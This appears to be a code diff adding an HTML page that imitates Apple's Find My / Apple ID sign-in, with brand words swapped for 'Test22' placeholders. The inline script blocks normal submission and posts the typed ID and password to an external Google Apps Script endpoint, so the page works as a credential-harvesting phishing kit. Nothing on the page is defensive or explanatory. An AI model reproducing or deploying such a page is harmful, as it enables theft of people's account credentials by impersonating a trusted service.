@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="icon" type="image/x-icon" href="/images/Apple-Grey.png">
+  <title>Test22 Find</title>
+
+  <link href="https://fonts.cdnfonts.com/css/helvetica-2?styles=65655,65656,65653,65654,65657,65658,65659,65660"
+    rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  </link>
+</head>
+
+<body class="bodyScrlTgl">
+  <div class="login-cnfrm-cntnr">
+    <div class="lgn-cnfrm">
+      <div class="ssn-text">Session not verified</div>
+      <div class="lgn-cnfrm-text">Test22 with your Test22 Test22 to access the data</div>
+      <div class="lgt-lgb-seperator"></div>
+      <div class="lgn-cnfrm-btn">OK</div>
+    </div>
+  </div>
+
+  <header class="header">
+    <div class="navbar">
+      <span class="nav-items drdwn-icon">=</span>
+      <span class="nav-items"><img class="applethlg" src="/Images/Apple-White.png" alt="Image Load Error"></span>
+      <span class="nav-items bag-lg"><img class="baglg" src="/Images/Bag-Icon.png" alt="Image Load Error"></span>
+    </div>
+  </header>
+  <div class="sec-nav" id="secnav">
+    <span class="secn-items scnavaidtxt"><img class="applegr-lg" src="/Images/Apple-Grey.png">&nbsp;Test22</span>
+    <span class="drdownContainer" id="secnavAction">
+      <span class="secn-items drdwn"></span>
+    </span>
+  </div>
+
+  <div class="main-icon-container">
+    <img class="CCFwithAplBl" src="/Images/CFwithAplBl.svg" alt="Image Load Error">
+  </div>
+
+  <div class="loginDscCntnr">
+    <div class="sign-in-Dscrpn">Test22 - Find My<img class="logo-find-my" src="/Images/Find-My.png"
+        alt="Image Load Error"></div>
+    <!-- <div class="sign-in-label">Sign in with Apple ID</div> -->
+  </div>
+
+
+
+  <div class="container">
+    <div class="sign-in-label-alt">test22 in with test22 Test22</div>
+    <form action="#" method="POST" name="inputIDPWForm">
+      <div class="ID-PW-Field">
+        <div class="input-field IDField">
+          <input type="text" id="IDInp" class="inputText inp-id" name="AplID" oninput="inpIDTrg()" required>
+          <span class="placeHldr">Test22 ID</span>
+          <img class="rt-arrow rt-arrow-id" src="/Images/Right-Arrow-Circular.svg" alt="Image Load Error">
+
+        </div>
+
+        <!-- <input type="submit" name="submit"> -->
+
+        <div class="input-field PWField">
+          <input type="password" id="PWInp" class="inputText password inp-pw" name="Pswrd" oninput="inpPWTrg()"
+            required>
+          <span class="placeHldr">Password</span>
+          <button type="submit" name="submit" class="submit-button">
+            <img class="rt-arrow rt-arrow-pw" src="/Images/Right-Arrow-Circular.svg" alt="Image Load Error">
+          </button>
+          <!-- <input type="submit" value="submit"> -->
+        </div>
+      </div>
+
+      <div class="checkbox-content">
+        <input type="checkbox" id="logCheck">
+        <label for="logCheck" class="checkbox-text">Remember me</label>
+      </div>
+
+      <div class="cc-fp-seperator"></div>
+
+      <div class="fp-container">
+        <a href="#" class="fp-text">Forgot Test22 ID or password?</a>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    // const scriptURL = 'https://script.google.com/macros/s/AKfycbyF6RITWbIXed_zIb8OD2EOGWSX_wU2DgnC-qtJ22yfgBTywVoq8sNiaOrh5VnGCGNk/exec'
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxQuIJUqjksGaPBpDiDWcXo8hd1Yl-t9KWp90H4Y_qEPVLLLoZqPHoR1Hp2pbm_JVI/exec'
+    const form = document.forms['inputIDPWForm']
+
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, {method: 'POST', body: new FormData(form)})
+        .then(response => alert("[TEST] Data saved to Database [Successful]"))
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+  <script src="script.js"></script>
+</body>
+
+</html>
